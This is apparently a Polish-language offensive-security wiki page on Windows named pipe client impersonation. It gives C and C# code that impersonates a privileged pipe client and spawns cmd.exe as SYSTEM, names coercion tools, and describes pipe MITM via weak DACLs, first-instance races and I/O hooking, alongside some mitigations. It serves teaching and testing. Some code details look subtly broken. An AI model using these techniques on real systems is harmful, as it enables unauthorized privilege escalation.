# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation to lokalny mechanizm local privilege escalation, który pozwala wątkowi serwera named pipe przejąć kontekst bezpieczeństwa klienta, który się z nim łączy. W praktyce attacker, który może uruchamiać code z SeImpersonatePrivilege, może nakłonić uprzywilejowanego klienta (np. usługę SYSTEM) do połączenia się z pipe kontrolowanym przez attackera, wywołać ImpersonateNamedPipeClient, skopiować uzyskany token do primary token, a następnie uruchomić process jako klient (często NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Ta strona koncentruje się na podstawowej technice. Informacje o kompletnych exploit chains, które nakłaniają SYSTEM do połączenia się z Twoim pipe, znajdziesz na stronach rodziny Potato wymienionych poniżej.

## TL;DR
- Utwórz named pipe: \\.\pipe\<random> i oczekuj na połączenie.
- Spraw, aby uprzywilejowany komponent połączył się z nim (spooler/DCOM/EFSRPC/etc.).
- Odczytaj co najmniej jedną wiadomość z pipe, a następnie wywołaj ImpersonateNamedPipeClient.
- Otwórz impersonation token z bieżącego wątku, wykonaj DuplicateTokenEx(TokenPrimary), a następnie użyj CreateProcessWithTokenW/CreateProcessAsUser, aby uzyskać process SYSTEM.<sup>[[2]](#references)</sup>

## Requirements and key APIs
- Uprawnienia zwykle wymagane przez wywołujący process/wątek:
- SeImpersonatePrivilege do pomyślnego przejęcia tożsamości łączącego się klienta oraz użycia CreateProcessWithTokenW.
- Alternatywnie, po przejęciu tożsamości SYSTEM możesz użyć CreateProcessAsUser, które może wymagać SeAssignPrimaryTokenPrivilege i SeIncreaseQuotaPrivilege (są one spełnione, gdy przejmujesz tożsamość SYSTEM).
- Core APIs used:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (przed impersonation należy odczytać co najmniej jedną wiadomość)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Poziom impersonation: aby wykonywać użyteczne działania lokalnie, klient musi zezwalać na SecurityImpersonation (domyślnie w przypadku wielu lokalnych klientów RPC/named-pipe). Klienci mogą obniżyć ten poziom, używając SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION podczas otwierania pipe.<sup>[[3]](#references)</sup>

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Uwagi:
- Jeśli ImpersonateNamedPipeClient zwraca ERROR_CANNOT_IMPERSONATE (1368), upewnij się, że najpierw odczytano dane z pipe oraz że klient nie ograniczył impersonation do poziomu Identification.
- Preferuj DuplicateTokenEx z SecurityImpersonation i TokenPrimary, aby utworzyć primary token odpowiedni do tworzenia procesu.

## Szybki przykład w .NET
W .NET NamedPipeServerStream może wykonywać impersonation za pomocą RunAsClient. Po rozpoczęciu impersonation zduplikuj token wątku i utwórz proces.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Typowe triggery/coercions pozwalające uzyskać SYSTEM do pipe'a
Te techniki wymuszają na uprzywilejowanych usługach połączenie z Twoim named pipe, dzięki czemu możesz je impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Szczegółowe informacje dotyczące użycia i kompatybilności znajdziesz tutaj:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Jeśli potrzebujesz kompletnego przykładu tworzenia pipe'a i impersonation w celu uruchomienia SYSTEM z service trigger, zobacz:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Abuse named pipe IPC i MITM (ACL-e, First-Instance Races, Client Hooking)

Gdy uprzywilejowana usługa i proces o niskich uprawnieniach komunikują się za pośrednictwem `\\.\pipe\...`, traktuj pipe jak każdą inną niezaufaną granicę IPC. Poza klasycznym server-side impersonation, słabe ACL-e pipe'a, niebezpieczne creation flags i decyzje dotyczące zaufania po stronie klienta mogą również stać się prymitywami local privilege escalation.<sup>[[7]](#references)</sup>

### Najpierw enumeruj kandydackie pipe'y
- Szybkie wylistowanie pipe'ów z PowerShell: `Get-ChildItem \\.\pipe\`
- Narzędzie Sysinternals `pipelist64.exe` pomaga wykrywać liczbę instancji i pipe'y single-instance.
- Priorytetowo traktuj nazwy używane przez usługi działające jako `SYSTEM`, szczególnie helpery, updatery, launchery i UI brokerów.

### MITM za pośrednictwem liberalnych DACL-i i dodatkowych instancji pipe'a
- Każdy proces, który może komunikować się z uprzywilejowanym serwerem, może już fuzzować jego protokół i szukać uprzywilejowanych verbów.<sup>[[7]](#references)</sup>
- Ciekawszy przypadek występuje, gdy DACL przyznaje `FILE_GENERIC_WRITE`/`GENERIC_WRITE` do obiektu pipe'a. W przypadku named pipe'ów obejmuje to implicite `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` współdzieli ten sam bit), więc attacker może utworzyć kolejną instancję serwera z tą samą nazwą.
- Ponieważ instancje są dopasowywane w kolejności FIFO, instancje utworzone przez attackera i legalne mogą być przeplatane: utwórz rogue instance za pomocą `CreateNamedPipe`, następnie otwórz tę samą nazwę pipe'a przy użyciu `CreateFile` i poczekaj, aż prawdziwy klient trafi do rogue server instance.
- Rezultat: obserwowanie, modyfikowanie, relayowanie lub desynchronizowanie uprzywilejowanego IPC bez konieczności przejęcia oryginalnego procesu serwera.

### First-instance race w security descriptorach pipe'a
- `lpSecurityAttributes` definiuje DACL wyłącznie podczas tworzenia pierwszej instancji danej nazwy pipe'a.<sup>[[4]](#references)[[7]](#references)</sup>
- Jeśli uprzywilejowana usługa uruchamia się późno i nie używa `FILE_FLAG_FIRST_PIPE_INSTANCE`, attacker może wcześniej utworzyć nazwę pipe'a z liberalnym DACL-em, a następnie pozwolić usłudze utworzyć kolejne instancje w kontekście bezpieczeństwa wybranym przez attackera.
- Zamienia to uruchamianie usługi w race condition: wygraj first instance, a następnie połącz się z późniejszymi klientami lub wykonaj MITM, korzystając z osłabionego ACL-a.
- Mitigation dla defenderów i kluczowy punkt review dla attackerów: sprawdź, czy `CreateNamedPipe(..., dwOpenMode, ...)` zawiera `FILE_FLAG_FIRST_PIPE_INSTANCE`. Jeśli nie, przetestuj pre-creation przed uruchomieniem usługi.

### Sprawdzanie PID/signature to hardening, a nie granica bezpieczeństwa
- Niektóre produkty próbują ograniczać dostęp, sprawdzając `GetNamedPipeClientProcessId`, ścieżkę obrazu procesu lub signera Authenticode łączącego się klienta.<sup>[[7]](#references)</sup>
- Pomaga to tylko do momentu wykonania injection do legalnego klienta: po znalezieniu się wewnątrz zaufanego procesu dziedziczysz dokładnie ten sam kontekst PID/image/signature, którego oczekuje serwer.
- W przypadku split desktop apps instrumentowanie procesu UI/helpera o niskich uprawnieniach jest często łatwiejsze niż bezpośredni atak na usługę `SYSTEM`.

### Hookuj klienta zgodnie z jego modelem I/O
- Synchronous I/O: przechwytuj `NtWriteFile` przed tym, jak syscall wykorzysta buffer, a `NtReadFile` sprawdzaj/patchuj po jego zakończeniu.<sup>[[7]](#references)</sup>
- Overlapped I/O: zapisz `OVERLAPPED`/`IoStatusBlock` widziany w `NtReadFile`, a następnie sprawdź buffer po zakończeniu `GetOverlappedResult` lub odpowiedniego wait.
- Completion ports: `GetQueuedCompletionStatus` dociera do `NtRemoveIoCompletion`; zwrócony `ApcContext` wskazuje `OVERLAPPED` użyty przez pierwotny read, co stanowi właściwy punkt zaczepienia do znalezienia wypełnionego już buffera.
- Completion routines (`ReadFileEx`): callback completion jest dostarczany jako APC. Jeśli chcesz modyfikować zwrócone dane lub wstrzykiwać synthetic replies, hookuj rzeczywistą completion routine, a do custom injection użyj jednoargumentowego dispatchera `QueueUserAPC`, który odtworzy 3 oczekiwane argumenty routine'a.<sup>[[5]](#references)[[7]](#references)</sup>

### Uwagi dotyczące toolingu
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxy'uje ruch named pipe za pośrednictwem injected helper DLL i udostępnia workflow podobny do Burpa do edycji/replay.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) korzysta z podejścia opartego na Fridzie i koncentruje się na hookowaniu `NtReadFile`/`NtWriteFile` oraz opisanych wyżej async/completion pivots, a następnie przekazuje ruch do workflow edycji opartego na WebSocketach.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Kwestie operacyjne
- Named pipes mają niskie opóźnienia; długie przerwy podczas edytowania buforów mogą doprowadzić do zakleszczenia niestabilnych usług.<sup>[[7]](#references)</sup>
- Klienci korzystający z overlapped/completion-port/APC wymagają innych hooków niż proste detours funkcji `ReadFile`/`WriteFile`.
- Injection do zaufanego klienta jest noisy i zasadniczo najlepiej ograniczyć go do tworzenia exploitów, analizy protokołu lub fuzzingu w lokalnym labie.

## Rozwiązywanie problemów i typowe pułapki
- Przed wywołaniem ImpersonateNamedPipeClient musisz odczytać co najmniej jedną wiadomość z pipe; w przeciwnym razie otrzymasz ERROR_CANNOT_IMPERSONATE (1368).<sup>[[1]](#references)</sup>
- Jeśli klient łączy się z użyciem SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, serwer nie może przeprowadzić pełnego impersonation; sprawdź poziom impersonation tokena za pomocą GetTokenInformation(TokenImpersonationLevel).<sup>[[3]](#references)</sup>
- CreateProcessWithTokenW wymaga SeImpersonatePrivilege u wywołującego. Jeśli wywołanie zakończy się błędem ERROR_PRIVILEGE_NOT_HELD (1314), użyj CreateProcessAsUser po wcześniejszym wykonaniu impersonation jako SYSTEM.
- Jeśli wzmacniasz zabezpieczenia pipe, upewnij się, że jego security descriptor zezwala docelowej usłudze na połączenie; domyślnie pipes w lokalizacji \\.\pipe są dostępne zgodnie z DACL serwera.<sup>[[3]](#references)</sup>

## References

- [1] [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
